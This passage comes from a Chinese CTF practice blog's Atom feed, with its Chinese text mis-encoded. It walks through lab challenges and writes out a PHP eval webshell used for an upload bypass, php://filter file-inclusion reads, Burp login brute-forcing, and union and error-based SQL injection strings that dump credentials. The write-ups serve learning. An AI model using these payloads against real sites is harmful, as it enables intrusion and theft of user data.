alt="6"></p><p>1</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2017ç¬¬äºŒå±Šå¹¿ä¸œçœå¼ºç½‘æ¯çº¿ä¸Šèµ›brokenâ€”â€”ï¼ˆjsfuckï¼‰&quot;&gt;&lt;a href=&quot;#2017ç¬¬äºŒå±Šå¹¿ä¸œçœå¼ºç½‘æ¯çº¿ä¸Šèµ›brokenâ€”â€”ï¼ˆjsfuckï¼‰&quot; class=&quot;headerlink&quot; title=&quot;2017ç¬¬äºŒå±Šå¹¿ä¸œçœå¼ºç½‘æ¯çº¿ä¸Šèµ›brokenâ€”â€”ï¼ˆjsf</summary>
      
    
    
    
    
    <category term="åˆ·é¢˜" scheme="http://example.com/tags/%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>iæ˜¥ç§‹</title>
    <link href="http://example.com/2021/04/19/i%E6%98%A5%E7%A7%8B1/"/>
    <id>http://example.com/2021/04/19/i%E6%98%A5%E7%A7%8B1/</id>
    <published>2021-04-19T14:25:33.000Z</published>
    <updated>2021-04-29T02:02:11.977Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬ä¸‰å±Šâ€œç™¾è¶Šæ¯â€ç¦å»ºçœé«˜æ ¡ç½‘ç»œç©ºé—´å®‰å…¨å¤§èµ›"><a href="#ç¬¬ä¸‰å±Šâ€œç™¾è¶Šæ¯â€ç¦å»ºçœé«˜æ ¡ç½‘ç»œç©ºé—´å®‰å…¨å¤§èµ›" class="headerlink" title="ç¬¬ä¸‰å±Šâ€œç™¾è¶Šæ¯â€ç¦å»ºçœé«˜æ ¡ç½‘ç»œç©ºé—´å®‰å…¨å¤§èµ›"></a>ç¬¬ä¸‰å±Šâ€œç™¾è¶Šæ¯â€ç¦å»ºçœé«˜æ ¡ç½‘ç»œç©ºé—´å®‰å…¨å¤§èµ›</h1><h2 id="ï¼ˆuploadæ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼‰"><a href="#ï¼ˆuploadæ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼‰" class="headerlink" title="ï¼ˆuploadæ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼‰"></a>ï¼ˆuploadæ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼‰</h2><p>æ‰“å¼€é¢˜ç›®åœ°å€å‘ç°æ˜¯ä¸€é“æ–‡ä»¶ä¸Šä¼ é¢˜ï¼Œå°è¯•ä¸Šä¼ ä¸€ä¸ªshellå†…å®¹ï¼Œjpgåç¼€çš„æ–‡ä»¶ï¼Œå‘ç°ä¸Šä¼ æˆåŠŸï¼Œè¯´æ˜ä¸æ£€æŸ¥æ–‡ä»¶å†…å®¹</p><p>å†ä¸Šä¼ ä¸€æ¬¡ï¼ŒburpæŠ“åŒ…ï¼Œä¿®æ”¹åç¼€jpgä¸ºphpï¼Œå‘ç°ä¹Ÿä¸Šä¼ æˆåŠŸ<img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\iæ˜¥ç§‹\1.png" alt="1"></p><p>ç”¨èšå‰‘è¿æ¥<img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\iæ˜¥ç§‹\2.png" alt="2"></p><p>æ²¡æœ‰ç›´æ¥ç»™æˆ‘ä»¬flagï¼Œé‚£ä¹ˆå¯èƒ½â€è—â€œèµ·æ¥äº†</p><p>åœ¨è™šæ‹Ÿç»ˆç«¯ä¸Šå¯»æ‰¾ï¼Œä¹Ÿæ‰¾ä¸åˆ°</p><p><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\iæ˜¥ç§‹\3.png" alt="3"></p><p>ç„¶åæˆ‘ä»¥ä¸ºflagè¢«åˆ äº†ï¼Œçœ‹äº†å¤§ä½¬çš„åšå®¢æ‰çŸ¥é“ï¼Œconfigæ–‡ä»¶é‡Œé¢æœ‰å†…å®¹<img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\iæ˜¥ç§‹\5.png" alt="5"></p><p><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\iæ˜¥ç§‹\4.png" alt="4"></p><p>äºæ˜¯æˆ‘ä»¬åœ¨èšå‰‘çš„ä¸»é¡µé€‰æ‹©æ•°æ®æ“ä½œï¼Œæ·»åŠ æ•°æ®åº“ï¼Œè¿æ¥ç”¨æˆ·å’Œè¿æ¥å¯†ç æ—¶åˆšåˆšé…ç½®æ–‡ä»¶çš„å†…å®¹</p><p><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\iæ˜¥ç§‹\6.png" alt="6"></p><p><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\iæ˜¥ç§‹\7.png" alt="7"></p><p>å…¶å®æ„Ÿè§‰èƒ½çŒœåˆ°configé‡Œé¢æœ‰ä¸œè¥¿è¿˜æ˜¯è›®ç¥å¥‡çš„ï¼Œå¯èƒ½æ˜¯configæ–‡ä»¶æ˜¯é…ç½®æ–‡ä»¶çš„åŸå› ï¼Œæ‰€ä»¥ä¼šä¸‹æ„è¯†çš„å»é‚£é‡Œæ‰¾çº¿ç´¢ã€‚</p><h1 id="â€œç™¾åº¦æ¯â€CTFæ¯”èµ›-ä¹æœˆåœº"><a href="#â€œç™¾åº¦æ¯â€CTFæ¯”èµ›-ä¹æœˆåœº" class="headerlink" title="â€œç™¾åº¦æ¯â€CTFæ¯”èµ› ä¹æœˆåœº"></a>â€œç™¾åº¦æ¯â€CTFæ¯”èµ› ä¹æœˆåœº</h1><h2 id="ï¼ˆæ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼‰"><a href="#ï¼ˆæ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼‰" class="headerlink" title="ï¼ˆæ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼‰"></a>ï¼ˆæ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼‰</h2><p>æˆ‘ä»¬å…ˆä¸Šä¼ ä¸€ä¸ªshellå†…å®¹ï¼Œjpgåç¼€çš„æ–‡ä»¶ï¼Œå‘ç°ä¸Šä¼ æˆåŠŸï¼Œè¯´æ˜ä¸æ£€æŸ¥æ–‡ä»¶å†…å®¹ã€‚ç„¶ååœ¨ä¸Šä¼ ä¸Šä¼ ä¸€æ¬¡ï¼Œburpæ‹¦æˆªä¿®æ”¹åç¼€ä¸ºphpï¼Œä¹Ÿä¸Šä¼ æˆåŠŸã€‚ä½†æ˜¯ä»–å¹¶æ²¡æœ‰ç›´æ¥å‘Šè¯‰æˆ‘ä»¬ä»–ä¸Šä¼ çš„ä½ç½®ï¼Œæˆ‘ä»¬æŸ¥çœ‹æºç å¯ä»¥çœ‹åˆ°<img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\iæ˜¥ç§‹\8.png" alt="8"></p><p>ç‚¹å‡»è¿›å…¥ç½‘é¡µ<img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\iæ˜¥ç§‹\9.png" alt="9"></p><p>æˆ‘ä»¬éƒ½çŸ¥é“ï¼ŒæŒ‰ç†æ¥è¯´è¿™é‡Œä¸åº”è¯¥æ˜¾å‡ºæºç çš„ï¼Œé‚£ä¹ˆå¯¹æ¯”è¯´æ˜è¿™é‡Œè¿‡æ»¤äº†<code>&lt;? </code>  å’Œ<code>php</code></p><p>æˆ‘ä»¬å¯ä»¥å°è¯•æ¢æ ‡ç­¾ï¼ˆå¦‚<code>&lt;script&gt;</code>ï¼‰æ¥ç»•è¿‡<code>&lt;?</code>è¿‡æ»¤</p><p>é€šè¿‡å¤§å°å†™æ¥ç»•è¿‡<code>php</code>è¿‡æ»¤</p><p><strong>æ³•1ï¼š</strong>æ„é€ ä¸€ä¸ªå†…å®¹ä¸ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;pHp&quot;&gt;@eval($_POST[&#39;pass&#39;]);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>åç¼€ä¸ºjspçš„æ–‡ä»¶ï¼Œä¸Šä¼ ï¼Œèšå‰‘è¿æ¥<img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\iæ˜¥ç§‹\10.png" alt="10"></p><p>æ³•2ï¼š<a href="https://blog.csdn.net/ITmincherry/article/details/102531096">https://blog.csdn.net/ITmincherry/article/details/102531096</a></p><h1 id="â€œç™¾åº¦æ¯â€CTFæ¯”èµ›-2017-äºŒæœˆåœº"><a href="#â€œç™¾åº¦æ¯â€CTFæ¯”èµ›-2017-äºŒæœˆåœº" class="headerlink" title="â€œç™¾åº¦æ¯â€CTFæ¯”èµ› 2017 äºŒæœˆåœº"></a>â€œç™¾åº¦æ¯â€CTFæ¯”èµ› 2017 äºŒæœˆåœº</h1><h2 id="ï¼ˆæ–‡ä»¶åŒ…å«æ¼æ´ï¼‰"><a href="#ï¼ˆæ–‡ä»¶åŒ…å«æ¼æ´ï¼‰" class="headerlink" title="ï¼ˆæ–‡ä»¶åŒ…å«æ¼æ´ï¼‰"></a>ï¼ˆæ–‡ä»¶åŒ…å«æ¼æ´ï¼‰</h2><p>æˆ‘ä»¬çœ‹åˆ°è¿™æ˜¯ä¸€é“æ–‡ä»¶åŒ…å«æ¼æ´é¢˜ï¼š<img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\iæ˜¥ç§‹\11.png" alt="11"></p><p>æˆ‘ä»¬ä¼šæƒ³åˆ°åˆ©ç”¨PHPçš„è¾“å…¥æµphp://input<img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\iæ˜¥ç§‹\12.png" alt="12"></p><p>æˆ‘ä»¬çœ‹åˆ°æœ‰ä¸€ä¸ªæ–‡ä»¶åæ¯”è¾ƒå¥‡ç‰¹ï¼Œç”¨PHP://filterè¯»å–dle345aae.phpæ–‡ä»¶<img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\iæ˜¥ç§‹\13.png" alt="13"></p><p>å†base64è§£ç å¾—</p><p><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\iæ˜¥ç§‹\14.png" alt="14"></p><h1 id="â€œç™¾åº¦æ¯â€CTFæ¯”èµ›-ä¹æœˆåœºâ€”â€”123"><a href="#â€œç™¾åº¦æ¯â€CTFæ¯”èµ›-ä¹æœˆåœºâ€”â€”123" class="headerlink" title="â€œç™¾åº¦æ¯â€CTFæ¯”èµ› ä¹æœˆåœºâ€”â€”123"></a>â€œç™¾åº¦æ¯â€CTFæ¯”èµ› ä¹æœˆåœºâ€”â€”123</h1><p>æ‰“å¼€å®¹å™¨ï¼Œå‘ç°ä¸€ä¸ªç™»å…¥æ¡†ï¼Œè¿˜ä»¥ä¸ºæ˜¯sqlæ³¨å…¥ï¼Œå°è¯•äº†ä¸€ä¸‹å‘ç°éƒ½æ˜¯æŠ¥é”™ï¼ŒæŸ¥çœ‹æºç ï¼š<img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\iæ˜¥ç§‹\15.png" alt="15"></p><p>ç„¶åæŸ¥çœ‹user.phpï¼Œä½†æ˜¯å‘ç°ç½‘é¡µé‡Œé¢ä»€ä¹ˆä¹Ÿæ²¡æœ‰ï¼Œæºç ä¹Ÿæ˜¯</p><p>äºæ˜¯æˆ‘ç”¨å¾¡å‰‘æ‰«äº†ä¸€ä¸‹ç«¯å£ï¼Œå‘ç°æœ‰ä¸€ä¸ªflag.phpçš„æ–‡ä»¶ï¼Œä½†æ˜¯ç‚¹æ™¯åŒºï¼Œå‘ç°è¢«éª—äº†ï¼Œæ˜¯å‡çš„ã€‚</p><p>äºæ˜¯çœ‹äº†å¤§ä½¬çš„æç¤ºï¼Œè¿™é‡Œåº”è¯¥æŸ¥çœ‹user.phpçš„å¤‡ä»½æ–‡ä»¶user.php.bakï¼Œå±äºå¤‡ä»½éšç§æ³„éœ²</p><p><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\iæ˜¥ç§‹\16.png" alt="16"></p><p>ä¸‹è½½ä¸‹æ¥ï¼Œé‡Œé¢éƒ½æ˜¯ç”¨æˆ·åï¼Œæ ¹æ®login.phpæºç çš„æç¤ºï¼Œå¯†ç ç”±ç”¨æˆ·å+ç”Ÿæ—¥å¹´ä»½æ„æˆ</p><p>å°è¯•burpçˆ†ç ´ï¼š<img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\iæ˜¥ç§‹\17.png" alt="17"></p><p>è®¾å®šä¸¤ä¸ªå‚æ•°ï¼Œç„¶åæ›´æ”¹æ”»å‡»æ¨¡å¼ä¸ºbattering ramï¼Œå³å¯¹ä¸¤ä¸ªå‚æ•°åŒæ—¶çˆ†ç ´ï¼Œä¸”payloadç›¸åŒ</p><p>æˆ‘ä»¬çŒœæµ‹è¿™ä¹ˆå¤šç”¨æˆ·é‡Œé¢åº”è¯¥ä¼šæœ‰äººæ˜¯1995å¹´å‡ºç”Ÿçš„ï¼Œç„¶åçˆ†ç ´å‡º<img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\iæ˜¥ç§‹\18.png" alt="18"></p><p>ç”¨çˆ†ç ´å‡ºçš„ç”¨æˆ·åå¯†ç ç™»å…¥ï¼Œé¡µé¢ä»€ä¹ˆå†…å®¹ä¹Ÿæ²¡æœ‰ï¼ŒæŸ¥çœ‹æºç å‘ç°ï¼š<img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\iæ˜¥ç§‹\19.png" alt="19"></p><p>F12è¿›å…¥å¼€å‘è€…æ¨¡å¼å°†æ³¨é‡Šç¬¦éƒ½åˆ æ‰ï¼Œå¾—åˆ°ä¸€ä¸ªä¸Šä¼ æ¡†ï¼Œä¸Šä¼ ä¸€å¥è¯æœ¨é©¬æ–‡ä»¶ï¼Œ<img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\iæ˜¥ç§‹\20.png" alt="20"></p><p>ä¸Šä¼ åç¼€jpgçš„ä¸€å¥è¯æœ¨é©¬<img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\iæ˜¥ç§‹\21.png" alt="21"></p><p>è¿™å°±æœ‰ç‚¹å¥‡æ€ªäº†ï¼Œä¸ºä»€ä¹ˆæ˜æ˜å·²ç»æ˜¯ç™½åå•çš„åç¼€äº†ï¼Œæ–‡ä»¶åè¿˜æ˜¯ä¸åˆæ³•<img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\iæ˜¥ç§‹\22.png" alt="22"></p><p>å°è¯•åˆ©ç”¨Apacheçš„åç¼€è§£æ<img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\iæ˜¥ç§‹\23.png" alt="23"></p><p>åˆ å»ä¸€å¥è¯æœ¨é©¬<img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\iæ˜¥ç§‹\24.png" alt="24"></p><p>æ‰“å¼€<code>/view.php</code>ç½‘é¡µ<img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\iæ˜¥ç§‹\25.png" alt="25"></p><p>ä¼ å‚ï¼š?file=1</p><p><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\iæ˜¥ç§‹\26.png" alt="26"></p><p>è¿‡æ»¤äº†<code>flag</code>ï¼Œå°è¯•åŒå†™ç»•è¿‡</p><p><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\iæ˜¥ç§‹\27.png" alt="27"></p><p>SP: burpçš„å‡ ç§æ”»å‡»æ¨¡å¼ï¼š<a href="https://blog.csdn.net/qq_39101049/article/details/90234669">https://blog.csdn.net/qq_39101049/article/details/90234669</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ç¬¬ä¸‰å±Šâ€œç™¾è¶Šæ¯â€ç¦å»ºçœé«˜æ ¡ç½‘ç»œç©ºé—´å®‰å…¨å¤§èµ›&quot;&gt;&lt;a href=&quot;#ç¬¬ä¸‰å±Šâ€œç™¾è¶Šæ¯â€ç¦å»ºçœé«˜æ ¡ç½‘ç»œç©ºé—´å®‰å…¨å¤§èµ›&quot; class=&quot;headerlink&quot; title=&quot;ç¬¬ä¸‰å±Šâ€œç™¾è¶Šæ¯â€ç¦å»ºçœé«˜æ ¡ç½‘ç»œç©ºé—´å®‰å…¨å¤§èµ›&quot;&gt;&lt;/a&gt;ç¬¬ä¸‰å±Šâ€œç™¾è¶Šæ¯â€ç¦å»ºçœé«˜æ ¡ç½‘ç»œç©ºé—´å®‰å…¨å¤§èµ›&lt;/</summary>
      
    
    
    
    
    <category term="åˆ·é¢˜" scheme="http://example.com/tags/%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>buuctf2</title>
    <link href="http://example.com/2021/04/13/buuctf2/"/>
    <id>http://example.com/2021/04/13/buuctf2/</id>
    <published>2021-04-13T10:42:02.000Z</published>
    <updated>2021-05-21T13:19:40.707Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL</h1><p>è¿™å…³ä¹‹å‰æœ‰åšè¿‡ç±»ä¼¼çš„ï¼Œä½†æ˜¯è¿™ä¸ªåº”è¯¥æ˜¯å‡çº§ç‰ˆ</p><p>è¿›è¿‡å°è¯•å¯çŸ¥æ³¨å…¥ç±»å‹ä¸ºå•å¼•å·æ³¨å…¥ï¼Œç”¨ä¸‡èƒ½å¯†ç å°è¯•ç™»å…¥</p><p><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf2\2.png" alt="2"></p><p>å‘ç°è¿™æ¬¡flagä¸åœ¨é‡Œé¢äº†ï¼Œé‚£æˆ‘ä»¬å°è¯•ä¸€ä¸‹è·å–ä»–çš„æ•°æ®åº“ä¿¡æ¯</p><p><strong>æ³•1ï¼š</strong></p><p><strong>unionè”åˆæ³¨å…¥</strong></p><p>ç¡®è®¤è¿”å›å­—æ®µæ•°ï¼š<code>1&#39; union select 1,2,3#</code></p><p>çˆ†åº“ï¼š<code>1&#39; union select 1,2,database()#</code></p><p>çˆ†è¡¨ï¼š<code>1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;geek&#39;#</code></p><p>çˆ†åˆ—ï¼š<code>1&#39; union select 1,2,group_cooncat(columns) from information_schema.columns where table_name=&#39;geekuser&#39;#</code></p><p>çˆ†å€¼ï¼š<code>1&#39; union select 1,2,group_concat(username,password) from geekuser#</code></p><p><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf2\5.png" alt="5"></p><p>å‘ç°è¯¥è¡¨ä¸‹åªæœ‰ä¸€è¡Œæ•°æ®ï¼šid=1,username=admin,password=â€œå­—ç¬¦ä¸²â€</p><p>äºæ˜¯æˆ‘ä»¬å†æŸ¥ä¸€ä¸‹<code>l0ve1ysq1</code>è¡¨â€”â€”<code>1&#39; union select 1,2,group_concat(username,password) from l0ve1ysq1#</code></p><p><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf2\6.png" alt="6"></p><p><strong>æ³•2ï¼š</strong></p><p>æŠ¥é”™æ³¨å…¥ï¼š</p><p>ç”±äºè¾“å…¥<code>1&#39;</code> ä¼šè¿”å›æŠ¥é”™ä¿¡æ¯ï¼Œå°è¯•æŠ¥é”™æ³¨å…¥ï¼š</p><p>çˆ†åº“ï¼š<code>1&#39; or extractvalue(1,concat(&#39;#&#39;,database()))#</code></p><p><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf2\1.png" alt="1"></p><p>çˆ†è¡¨ï¼š<code>1&#39; or extractvalue(1,concat(&#39;#&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;geek&#39;)))#</code><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf2\3.png" alt="3"></p><p>çˆ†åˆ—ï¼š<code>1&#39; or extractvalue(1,concat(&#39;#&#39;,(select group_concat(column_name) from information_schema.columns where table_name=&#39;geekuser&#39;)))#</code></p><p><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf2\4.png" alt="4"></p><p>çˆ†å€¼ï¼š<code>1&#39; or extractvalue(1,concat(&#39;#&#39;,(select password from geekuser where id=1)))#</code></p><p>å‘ç°è¿”å›ä¸€ä¸²å­—ç¬¦ä¸²ï¼Œä½†æ˜¯flagä¸åœ¨å…¶ä¸­ï¼ŒæŸ¥çœ‹å¦ä¸€ä¸ªè¡¨</p><p><code>1&#39; or extractvalue(1,concat(&#39;#&#39;,(select password from l0ve1ysq1 where id=1)))#</code><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf2\7.png" alt="7"></p><p>å‘ç°ç”±äºæŠ¥é”™æ³¨å…¥çš„è¿”å›é•¿åº¦çš„é™åˆ¶ï¼Œåç»­çš„å€¼æ²¡æœ‰å…¨éƒ¨å›æ˜¾åœ¨é¡µé¢ä¸Šï¼Œå› æ­¤è¦ç”¨substrå‡½æ•°å»æˆªï¼Œè¿˜æŒºéº»çƒ¦çš„ï¼Œåç»­çš„å°±ä¸å†™äº†ã€‚</p><h1 id="ACTF2020-æ–°ç”Ÿèµ›-BackupFileï¼ˆæ–‡ä»¶å¤‡ä»½-å¼±å£ä»¤ç»•è¿‡ï¼‰"><a href="#ACTF2020-æ–°ç”Ÿèµ›-BackupFileï¼ˆæ–‡ä»¶å¤‡ä»½-å¼±å£ä»¤ç»•è¿‡ï¼‰" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]BackupFileï¼ˆæ–‡ä»¶å¤‡ä»½+å¼±å£ä»¤ç»•è¿‡ï¼‰"></a>[ACTF2020 æ–°ç”Ÿèµ›]BackupFileï¼ˆæ–‡ä»¶å¤‡ä»½+å¼±å£ä»¤ç»•è¿‡ï¼‰</h1><p>æ‰“å¼€å®¹å™¨å‘ç°ä»€ä¹ˆä¹Ÿæ²¡æœ‰ï¼ŒæŸ¥çœ‹æºç ä¹Ÿæ²¡æœ‰ï¼Œå¾¡å‰‘æ‰«æä¹Ÿæ²¡æœ‰ï¼Œçœ‹åˆ°é¢˜ç›®æç¤ºå¤‡ä»½æ–‡ä»¶ï¼Œè”æƒ³åˆ°ä¹‹å‰æœ‰åšè¿‡ä»¥<code>.bak</code>ä¸ºåç¼€çš„å¤‡ä»½æ–‡ä»¶çš„é¢˜</p><p><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf2\8.png" alt="8"></p><p>æ‰“å¼€æ–‡ä»¶å‘ç°ä¸€æ®µæºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    $key = $_GET[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric($key)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $key = intval($key);</span><br><span class="line">    $str = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>($key == $str) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»£ç å®¡è®¡ï¼šå°†getçš„å€¼èµ‹ç»™å‚æ•°keyï¼Œå…ˆåˆ¤æ–­keyæ˜¯å¦ä¸ºæ•°å­—ï¼Œä¸æ˜¯åˆ™é€€å‡ºï¼Œæ˜¯åˆ™é€šè¿‡intvalè·å–å‚æ•°ä¸­çš„æ•´æ•°éƒ¨åˆ†ï¼Œç„¶åå’Œå˜é‡strçš„å€¼è¿›è¡Œå¯¹æ¯”ï¼Œç›¸ç­‰åˆ™è¾“å‡ºflagã€‚</p><p><strong>spï¼š</strong></p><p>ç”±äº<code>php</code>å¼±å£ä»¤çš„ç‰¹æ€§ï¼Œå­—ç¬¦ä¸²å’Œæ•°å­—æ¯”è¾ƒä½¿ç”¨==æ—¶,å­—ç¬¦ä¸²ä¼šå…ˆè½¬æ¢ä¸ºæ•°å­—ç±»å‹å†æ¯”è¾ƒ</p><p>var_dump(â€˜aâ€™ == 0);//true                   â€”â€”æ­¤æ—¶aå­—ç¬¦ä¸²ç±»å‹è½¬åŒ–æˆæ•°å­—ï¼Œå› ä¸ºaå­—ç¬¦ä¸²å¼€å¤´ä¸­æ²¡æœ‰æ‰¾åˆ°æ•°å­—ï¼Œæ‰€ä»¥è½¬æ¢ä¸º0<br>var_dump(â€˜123aâ€™ == 123);//true        â€”â€”è¿™é‡Œâ€™123aâ€™ä¼šè¢«è½¬æ¢ä¸º123</p><p><code>php</code>ä¸­æœ‰è¿™æ ·ä¸€ä¸ªè§„å®šï¼šå­—ç¬¦ä¸²çš„å¼€å§‹éƒ¨åˆ†å†³å®šäº†å®ƒçš„å€¼ï¼Œå¦‚æœè¯¥å­—ç¬¦ä¸²ä»¥åˆæ³•çš„æ•°å­—å¼€å§‹ï¼Œåˆ™ä½¿ç”¨è¯¥æ•°å­—è‡³å’Œå®ƒè¿ç»­çš„æœ€åä¸€ä¸ªæ•°å­—ç»“æŸï¼Œå¦åˆ™å…¶æ¯”è¾ƒæ—¶æ•´ä½“å€¼ä¸º0ã€‚<br>ä¸¾ä¾‹ï¼š</p><p>var_dump(â€˜a123â€™ == 123);//false</p><p>var_dump(â€˜1233aâ€™ == 123);//false</p><p>var_dump(â€˜123a1â€™ == 123);//true</p><p>å› æ­¤è¿™é‡Œæˆ‘ä»¬åªéœ€è¦æ„é€ payloadï¼š?key=123å³å¯</p><h1 id="æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlag"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlag" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag</h1><p>ç‚¹å¼€å®¹å™¨ï¼Œè¿›å…¥PAYFLAGé¡µé¢ï¼ŒæŸ¥çœ‹æºç ï¼š<img src="/buuctf2.assets/9.png" alt="9"></p><p>æˆ‘ä»¬éœ€è¦ä¸Šä¼ moneyå’Œpasswordï¼Œæ ¹æ®ç½‘é¡µæç¤ºmoney=100000000ï¼Œpassword=404aç»•è¿‡is_numericå’Œphpå¼±å£ä»¤ç›¸ç­‰</p><p><img src="/buuctf2.assets/13.png" alt="13"></p><p>æ²¡ä»€ä¹ˆå†…å®¹ï¼ŒæŠ“åŒ…è¯•è¯•</p><p><img src="/buuctf2.assets/10.png" alt="10"></p><p>ä¿®æ”¹userçš„å€¼ä¸ºstudentï¼Œä½†æ˜¯è¿™æ ·ä¹Ÿä¸è¡Œï¼Œé‚£æ”¹æˆ1ï¼š<img src="/buuctf2.assets/11.png" alt="11"></p><p>å¤ªé•¿äº†ï¼Œå°è¯•æ”¹ç”¨ç§‘å­¦è®¡æ•°æ³•<img src="/buuctf2.assets/12.png" alt="12"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL&quot;&gt;&lt;a href=&quot;#æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL&quot; class=&quot;headerlink&quot; title=&quot;[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL&quot;&gt;&lt;/a&gt;[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL&lt;/h1&gt;&lt;p&gt;è¿™å…³ä¹‹å‰</summary>
      
    
    
    
    
    <category term="åˆ·é¢˜" scheme="http://example.com/tags/%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>PHPä¼ªåè®®</title>
    <link href="http://example.com/2021/04/08/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <id>http://example.com/2021/04/08/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/</id>
    <published>2021-04-08T08:27:15.000Z</published>
    <updated>2021-07-19T04:46:30.819Z</updated>
    
    
    
    
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>bugku2</title>
    <link href="http://example.com/2021/04/07/bugku2/"/>
    <id>http://example.com/2021/04/07/bugku2/</id>
    <published>2021-04-07T14:50:37.000Z</published>
    <updated>2021-07-12T11:09:25.401Z</updated>
    
